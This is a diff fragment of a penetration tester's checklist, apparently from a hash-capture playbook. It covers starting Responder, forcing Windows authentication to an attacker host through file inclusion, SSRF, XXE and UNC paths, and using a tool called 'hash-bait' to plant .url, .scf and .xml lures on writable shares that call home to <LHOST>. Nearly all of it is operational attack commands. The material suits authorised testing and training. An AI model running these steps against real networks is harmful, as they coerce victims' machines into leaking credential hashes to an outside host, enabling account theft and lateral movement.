@@ -12,11 +12,11 @@ sudo responder -I tun0 -A
 - [ ] File inclusion on a Windows web server: ?<Param>=\\<LHOST>\share\x
 - [ ] SSRF, XXE or an upload that takes a path: \\<LHOST>\share or file://<LHOST>/share
 - [ ] A shell as another user: dir \\<LHOST>\share
-At the pwn-broker prompt: tool install hash-bait and tool install impacket.
+At the pwn-broker prompt: tool install hash-bait, tool install impacket and tool install netexec.
 A lure on every share I can write, for whoever browses it:
 hash-bait list -t <TargetIP> -u '<Username>' --pass '<Password>'
-hash-bait drop -t <TargetIP> -u '<Username>' --pass '<Password>' -s <Share> -c <LHOST> --no-listen
-hash-bait clean -t <TargetIP> -u '<Username>' --pass '<Password>' -s <Share>
+hash-bait drop -t <TargetIP> -u '<Username>' --pass '<Password>' -s '<Share>' -c <LHOST> --no-listen
+hash-bait clean -t <TargetIP> -u '<Username>' --pass '<Password>' -s '<Share>'
 - [ ] drop plants .url, .scf and .xml lures that call home to <LHOST> for whoever browses them
 - [ ] --no-listen keeps Responder off: without it drop starts Responder itself, which belongs only in the labelled sections below
 - [ ] clean removes exactly what drop planted, matched by the lure's basename
